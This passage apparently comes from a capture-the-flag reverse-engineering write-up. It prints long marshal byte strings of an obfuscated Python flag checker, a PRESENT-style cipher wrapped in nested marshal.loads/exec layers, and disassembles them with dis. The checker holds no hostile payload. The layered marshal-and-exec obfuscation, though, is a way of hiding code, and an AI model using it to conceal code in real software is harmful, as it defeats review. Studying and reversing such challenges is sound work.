\x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line"></span><br><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="built_in">print</span>(dis.dis(l))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================================================================================================================================&quot;</span>)</span><br><span class="line">l1 = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(marshal.loads(l1)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================================================================================================================================&quot;</span>)</span><br><span class="line">l2 = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s 